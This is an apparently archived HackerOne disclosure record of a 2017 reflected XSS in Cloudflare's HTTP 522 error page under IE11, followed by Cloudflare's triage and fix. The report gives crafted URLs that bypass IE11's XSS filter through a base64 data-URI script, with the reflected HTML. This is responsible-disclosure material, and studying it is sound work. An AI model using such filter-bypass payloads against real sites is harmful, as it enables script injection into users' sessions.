{"id":214620,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTQ2MjA=","url":"https://hackerone.com/reports/214620","title":"Cloudflare based XSS for IE11","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-03-19T08:43:42.150Z","submitted_at":"2017-03-19T08:43:42.150Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"reactors08","url":"/reactors08","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/003/051/0b6de7bc77e36e6a2e7db2650a8c18c1108fe28e_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":41,"url":"https://hackerone.com/cloudflare","handle":"cloudflare","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Cloudflare Vulnerability Disclosure","twitter_handle":"cloudflare","website":"https://www.cloudflare.com/disclosure","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-05-04T18:48:58.437Z","bug_reporter_agreed_on_going_public_at":"2017-04-04T18:48:51.050Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"XSS can be performed via malformed URI request in IE11(and potentially in Edge).\nCloudflare has a vulnerable default error page for HTTP 522.\nFor example (it takes some time):\nhttps://hacker.one/%ff\nLets use IE11 to proof the concept.\n`https://hacker.one/%ff/?\"escaped`\nResult:\n\u003e `\u003ca ... href=\"/%ff/?\" escaped\"=\"\"\u003ehttps://hacker.one/%ff/?\"escaped\u003c/a\u003e`\n\nNow lets bypass IE11 anti-XSS filter:\n\u003e `https://hacker.one/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='`\n\nor\n\u003e `https://bugcrowd.com/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='`\n\nResult:\n\n\u003e `This page (\u003ca href=\"/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='\" style=\"margin: 0;padding: 0;text-decoration: underline;font: 12px Helvetica,Arial,sans-serif;color: #007ed9;font-weight: normal;text-align: left;\"\u003ehttps://hacker.one/%ff/'/src='data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='?\"\u003e\u003c/script\u003e\u003cscript/xxxx='\u003c/a\u003e) is currently offline.`","vulnerability_information_html":"\u003cp\u003eXSS can be performed via malformed URI request in IE11(and potentially in Edge).\u003cbr\u003e\nCloudflare has a vulnerable default error page for HTTP 522.\u003cbr\u003e\nFor example (it takes some time):\u003cbr\u003e\n\u003ca title=\"https://hacker.one/%ff\" href=\"/redirect?url=https%3A%2F%2Fhacker.one%2F%25ff\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://hacker.one/%ff\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nLets use IE11 to proof the concept.\u003cbr\u003e\n\u003ccode\u003ehttps://hacker.one/%ff/?\u0026quot;escaped\u003c/code\u003e\u003cbr\u003e\nResult:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003e\u0026lt;a ... href=\u0026quot;/%ff/?\u0026quot; escaped\u0026quot;=\u0026quot;\u0026quot;\u0026gt;https://hacker.one/%ff/?\u0026quot;escaped\u0026lt;/a\u0026gt;\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eNow lets bypass IE11 anti-XSS filter:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003ehttps://hacker.one/%ff/\u0026#39;/src=\u0026#39;data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\u0026#39;?\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script/xxxx=\u0026#39;\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eor\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003ehttps://bugcrowd.com/%ff/\u0026#39;/src=\u0026#39;data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\u0026#39;?\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script/xxxx=\u0026#39;\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eResult:\u003c/p\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003eThis page (\u0026lt;a href=\u0026quot;/%ff/\u0026#39;/src=\u0026#39;data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\u0026#39;?\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script/xxxx=\u0026#39;\u0026quot; style=\u0026quot;margin: 0;padding: 0;text-decoration: underline;font: 12px Helvetica,Arial,sans-serif;color: #007ed9;font-weight: normal;text-align: left;\u0026quot;\u0026gt;https://hacker.one/%ff/\u0026#39;/src=\u0026#39;data:text/html;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\u0026#39;?\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script/xxxx=\u0026#39;\u0026lt;/a\u0026gt;) is currently offline.\u003c/code\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n","original_report_id":null,"original_report_url":null,"attachments":[{"id":169905,"file_name":"cloudflare_hackerone_xss_offline_page.jpg","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/169/905/8c76b97ac53721aba681a79c82f8d4a67672f04c/cloudflare_hackerone_xss_offline_page.jpg?response-content-disposition=attachment%3B%20filename%3D%22cloudflare_hackerone_xss_offline_page.jpg%22%3B%20filename%2A%3DUTF-8%27%27cloudflare_hackerone_xss_offline_page.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T045802Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=6bc6290c3089b750b5e9e2152cb34580095bc4a532958d374fe9053ac215c8b6","file_size":169502,"type":"image/jpeg"}],"allow_singular_disclosure_at":"2017-05-04T18:48:51.089Z","allow_singular_disclosure_after":-115294151.46476506,"singular_disclosure_allowed":true,"vote_count":26,"voters":["jin","sp1d3rs","bobrov","iamnoooob","spam404","fillawful","zlz","jon_bottarini","bigbear_","cuso4","and 16 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1551068,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey thanks for the report.\n\nI will verify this report and get back to you in the next day.\n\nEvan","markdown_message":"\u003cp\u003eHey thanks for the report.\u003c/p\u003e\n\n\u003cp\u003eI will verify this report and get back to you in the next day.\u003c/p\u003e\n\n\u003cp\u003eEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-19T19:30:37.819Z","updated_at":"2017-03-19T19:30:37.819Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553544,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Just to update you. I'm working on getting a Windows machine to test this on.\n\nI'm guessing the XSS takes place in the \"toolbar\" type thing at the top of the screen, that shows the URL?\n\nEvan","markdown_message":"\u003cp\u003eJust to update you. I\u0026#39;m working on getting a Windows machine to test this on.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m guessing the XSS takes place in the \u0026quot;toolbar\u0026quot; type thing at the top of the screen, that shows the URL?\u003c/p\u003e\n\n\u003cp\u003eEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-20T22:42:17.778Z","updated_at":"2017-03-20T22:42:17.778Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1553637,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I got ahold of a windows computer (unfortunately) and verified this works.\n\nI'll look in to how to fix this. Thanks.","markdown_message":"\u003cp\u003eI got ahold of a windows computer (unfortunately) and verified this works.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll look in to how to fix this. Thanks.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-20T23:43:09.909Z","updated_at":"2017-03-20T23:43:09.909Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1562182,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sorry about such a long delay updating you,\n\nI opened up a PR internally to fix this problem. It's a neat issue in our code that led to it, and an excellent find. Thanks.\n\nEvan","markdown_message":"\u003cp\u003eSorry about such a long delay updating you,\u003c/p\u003e\n\n\u003cp\u003eI opened up a PR internally to fix this problem. It\u0026#39;s a neat issue in our code that led to it, and an excellent find. Thanks.\u003c/p\u003e\n\n\u003cp\u003eEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-24T20:03:42.026Z","updated_at":"2017-03-24T20:03:42.026Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1570976,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"My change got merged and is awaiting release. It should be out tomorrow.\n\nThe release schedule is a little more challenging for changes at the edge, as they are very sensitive.\n\nEvan","markdown_message":"\u003cp\u003eMy change got merged and is awaiting release. It should be out tomorrow.\u003c/p\u003e\n\n\u003cp\u003eThe release schedule is a little more challenging for changes at the edge, as they are very sensitive.\u003c/p\u003e\n\n\u003cp\u003eEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-29T17:01:26.292Z","updated_at":"2017-03-29T17:01:26.292Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1581934,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"This should have been fixed as of last week. Can you confirm it's fixed? It looks fixed to me (I no longer get an alert box).\n\nEvan","markdown_message":"\u003cp\u003eThis should have been fixed as of last week. Can you confirm it\u0026#39;s fixed? It looks fixed to me (I no longer get an alert box).\u003c/p\u003e\n\n\u003cp\u003eEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-03T23:40:16.064Z","updated_at":"2017-04-03T23:40:16.064Z","actor":{"username":"evancf","cleared":false,"url":"/evancf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/036/174/5191f029df44b246d547337bf7fa90b7bd549360_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"reactors08","url":"/reactors08"},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1582292,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The bug has been fixed.","markdown_message":"\u003cp\u003eThe bug has been fixed.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-04T06:52:41.580Z","updated_at":"2017-04-04T06:52:41.580Z","actor":{"username":"reactors08","cleared":false,"url":"/reactors08","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/051/0b6de7bc77e36e6a2e7db2650a8c18c1108fe28e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1583570,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Lets disclose","markdown_message":"\u003cp\u003eLets disclose\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-04T18:48:51.063Z","updated_at":"2017-04-04T18:48:51.063Z","first_to_agree":true,"actor":{"username":"reactors08","cleared":false,"url":"/reactors08","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/051/0b6de7bc77e36e6a2e7db2650a8c18c1108fe28e_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1602853,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"@reactors08 do you have an email address that I can ask you your address for, so we can send you some swag in appreciation?\n\nEvan","markdown_message":"\u003cp\u003e\u003ca href=\"/reactors08\"\u003e@reactors08\u003c/a\u003e do you have an email address that I can ask you your address for, so we can send you some swag in appreciation?\u003c/p\u003e\n\n\u003cp\u003eEvan\u003c/p\u003e\n","automated_response":false,"created_at":"2017-04-10T17:09:14.961Z","updated_at":"2017-04-10T17:09:14.961Z","actor":{"url":"/cloudflare","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Cloudflare Vulnerability Disclosure"}},"reporter":{"username":"reactors08","url":"/reactors08"},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1654545,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-04T18:48:58.448Z","updated_at":"2017-05-04T18:48:58.448Z","actor":{"url":"/cloudflare","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Cloudflare Vulnerability Disclosure"}},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}